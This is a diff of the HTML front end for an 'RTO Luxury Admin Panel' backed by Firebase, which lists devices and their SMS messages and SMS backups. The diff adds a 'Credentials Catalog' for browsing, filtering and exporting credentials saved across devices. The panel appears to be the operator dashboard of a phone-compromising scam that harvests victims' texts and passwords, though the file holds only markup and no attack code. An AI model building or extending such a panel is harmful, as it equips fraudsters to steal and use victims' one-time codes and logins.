@@ -1,6 +1,6 @@
 <!-- ============================================================ -->
-<!-- index.html - COMPLETE WITH ALL MOBILE ENHANCEMENTS          -->
-<!-- ============================================================ -->
+<!-- index.html - COMPLETE WITH ALL FEATURES                     -->
+/* ============================================================ */
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -11,11 +11,18 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
     <title>RTO Luxury Admin Panel</title>
 
+    <!-- Fonts & Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
     <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet" />
+    
+    <!-- Firebase -->
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+    
+    <!-- CSS Files -->
     <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="device-card.css" />
+    <link rel="stylesheet" href="credentials.css" />
 </head>
 <body>
 
@@ -55,6 +62,11 @@
                         <span>Messages</span>
                         <span class="nav-badge" id="smsCount">0</span>
                     </button>
+                    <button class="nav-item" data-panel="credentials" onclick="togglePanel('credentials')">
+                        <i class="fas fa-key"></i>
+                        <span>Credentials</span>
+                        <span class="nav-badge" id="credCount">0</span>
+                    </button>
                     <button class="nav-item" data-panel="backup" onclick="togglePanel('backup')">
                         <i class="fas fa-database"></i>
                         <span>Backup</span>
@@ -76,7 +88,9 @@
             <!-- ===== CONTENT AREA ===== -->
             <main class="content-area" id="contentArea">
 
-                <!-- ===== DEVICES PANEL ===== -->
+                <!-- ========================================================== -->
+                <!-- DEVICES PANEL                                              -->
+                <!-- ========================================================== -->
                 <div class="panel active" id="panelDevices">
                     <div class="panel-header">
                         <div>
@@ -110,12 +124,15 @@
                         </button>
                     </div>
                     
+                    <!-- Devices Container -->
                     <div id="devicesContainer">
                         <div class="loading-luxury"><span class="loader-ring"></span> Loading devices...</div>
                     </div>
                 </div>
 
-                <!-- ===== SMS PANEL ===== -->
+                <!-- ========================================================== -->
+                <!-- SMS PANEL                                                 -->
+                <!-- ========================================================== -->
                 <div class="panel" id="panelSms">
                     <div class="panel-header">
                         <div>
@@ -138,7 +155,91 @@
                     </button>
                 </div>
 
-                <!-- ===== BACKUP PANEL ===== -->
+                <!-- ========================================================== -->
+                <!-- CREDENTIALS CATALOG PANEL                                 -->
+                <!-- ========================================================== -->
+                <div class="panel" id="panelCredentials">
+                    <div class="panel-header">
+                        <div>
+                            <h2><i class="fas fa-key" style="color:var(--gold);"></i> Credentials Catalog</h2>
+                            <p class="panel-sub">View and manage all saved credentials across devices</p>
+                        </div>
+                        <div class="panel-stats">
+                            <span class="stat-item"><i class="fas fa-key"></i> <span id="panelCredCount">0</span></span>
+                            <span class="stat-item"><i class="fas fa-mobile-alt"></i> <span id="panelCredDevices">0</span></span>
+                            <button class="btn-delete-all credential" onclick="deleteAllCredentials()" style="padding:4px 12px;font-size:10px;">
+                                <i class="fas fa-trash-alt"></i> Delete All
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Credentials Catalog Content -->
+                    <div class="credentials-catalog active">
+                        <!-- Catalog Header -->
+                        <div class="catalog-header">
+                            <div class="catalog-title">
+                                <h3>🔐 All Saved Credentials</h3>
+                                <span class="title-badge">Secure Vault</span>
+                            </div>
+                            <div class="catalog-stats">
+                                <span class="stat-chip">
+                                    <i class="fas fa-key"></i>
+                                    Total: <span class="num" id="catalogTotalCreds">0</span>
+                                </span>
+                                <span class="stat-chip">
+                                    <i class="fas fa-mobile-alt"></i>
+                                    Devices: <span class="num" id="catalogTotalDevices">0</span>
+                                </span>
+                            </div>
+                        </div>
+
+                        <!-- Toolbar -->
+                        <div class="catalog-toolbar">
+                            <div class="toolbar-search">
+                                <i class="fas fa-search"></i>
+                                <input type="text" id="credSearchInput" placeholder="Search by device, field, or value..." />
+                            </div>
+                            <button class="toolbar-btn active" onclick="filterCreds('all')" id="credFilterAll">
+                                <i class="fas fa-list"></i> All
+                            </button>
+                            <button class="toolbar-btn" onclick="filterCreds('hasCreds')" id="credFilterHasCreds">
+                                <i class="fas fa-check-circle"></i> With Creds
+                            </button>
+                            <button class="toolbar-btn" onclick="filterCreds('noCreds')" id="credFilterNoCreds">
+                                <i class="fas fa-circle"></i> No Creds
+                            </button>
+                            <button class="toolbar-btn" onclick="exportCredentials()">
+                                <i class="fas fa-download"></i> Export
+                            </button>
+                            <button class="toolbar-btn danger" onclick="deleteAllCredentials()">
+                                <i class="fas fa-trash"></i> Delete All
+                            </button>
+                        </div>
+
+                        <!-- Device Filter Tabs -->
+                        <div class="device-filter-tabs" id="credDeviceTabs">
+                            <!-- Dynamically generated -->
+                        </div>
+
+                        <!-- Credentials Grid -->
+                        <div class="creds-grid" id="credsGrid">
+                            <div class="no-creds" style="grid-column:1/-1;">
+                                <div class="no-creds-icon"><i class="fas fa-key"></i></div>
+                                <h4>Loading Credentials...</h4>
+                                <p>Please wait while we fetch your data</p>
+                            </div>
+                        </div>
+
+                        <!-- Pagination -->
+                        <div class="catalog-pagination" id="credPagination">
+                            <!-- Dynamically generated -->
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ========================================================== -->
+                <!-- BACKUP PANEL                                              -->
+                <!-- ========================================================== -->
                 <div class="panel" id="panelBackup">
                     <div class="panel-header">
                         <div>
@@ -198,7 +299,9 @@
                     </div>
                 </div>
 
-                <!-- ===== ANALYTICS PANEL ===== -->
+                <!-- ========================================================== -->
+                <!-- ANALYTICS PANEL                                           -->
+                <!-- ========================================================== -->
                 <div class="panel" id="panelAnalytics">
                     <div class="panel-header">
                         <div>
@@ -241,7 +344,9 @@
             </main>
         </div>
 
-        <!-- ===== MOBILE BOTTOM NAV ===== -->
+        <!-- ========================================================== -->
+        <!-- MOBILE BOTTOM NAV                                          -->
+        <!-- ========================================================== -->
         <nav class="mobile-bottom-nav" id="mobileBottomNav">
             <button class="mobile-nav-item active" data-panel="devices" onclick="togglePanel('devices')">
                 <i class="fas fa-mobile-alt"></i>
@@ -251,6 +356,11 @@
                 <i class="fas fa-envelope"></i>
                 <span>Messages</span>
                 <span class="mobile-nav-badge" id="mobileSmsBadge">0</span>
+            </button>
+            <button class="mobile-nav-item" data-panel="credentials" onclick="togglePanel('credentials')">
+                <i class="fas fa-key"></i>
+                <span>Creds</span>
+                <span class="mobile-nav-badge" id="mobileCredBadge">0</span>
             </button>
             <button class="mobile-nav-item" data-panel="backup" onclick="togglePanel('backup')">
                 <i class="fas fa-database"></i>
@@ -262,7 +372,9 @@
             </button>
         </nav>
 
-        <!-- ===== FLOATING ACTION BUTTON ===== -->
+        <!-- ========================================================== -->
+        <!-- FLOATING ACTION BUTTON                                     -->
+        <!-- ========================================================== -->
         <div class="fab-container" id="fabContainer">
             <button class="fab-main" onclick="toggleFabMenu()">
                 <i class="fas fa-plus"></i>
@@ -283,7 +395,9 @@
             </div>
         </div>
 
-        <!-- ===== BOTTOM SHEET ===== -->
+        <!-- ========================================================== -->
+        <!-- BOTTOM SHEET                                              -->
+        <!-- ========================================================== -->
         <div class="bottom-sheet-overlay" id="bottomSheetOverlay" onclick="closeBottomSheet()">
             <div class="bottom-sheet" onclick="event.stopPropagation()">
                 <div class="bottom-sheet-handle"></div>
@@ -291,7 +405,11 @@
             </div>
         </div>
 
-        <!-- ===== MODALS ===== -->
+        <!-- ========================================================== -->
+        <!-- MODALS                                                    -->
+        <!-- ========================================================== -->
+
+        <!-- SMS Modal -->
         <div class="modal-luxury" id="smsModal" onclick="closeSmsModal(event)">
             <div class="modal-luxury-content" onclick="event.stopPropagation()">
                 <div class="modal-luxury-header">
@@ -307,6 +425,7 @@
             </div>
         </div>
 
+        <!-- Backup SMS Modal -->
         <div class="modal-luxury" id="backupSmsModal" onclick="closeBackupSmsModal(event)">
             <div class="modal-luxury-content" style="max-width:800px;" onclick="event.stopPropagation()">
                 <div class="modal-luxury-header">
@@ -324,6 +443,10 @@
 
     </div>
 
+    <!-- ========================================================== -->
+    <!-- JAVASCRIPT                                                -->
+    <!-- ========================================================== -->
     <script src="app.js"></script>
+
 </body>
 </html>
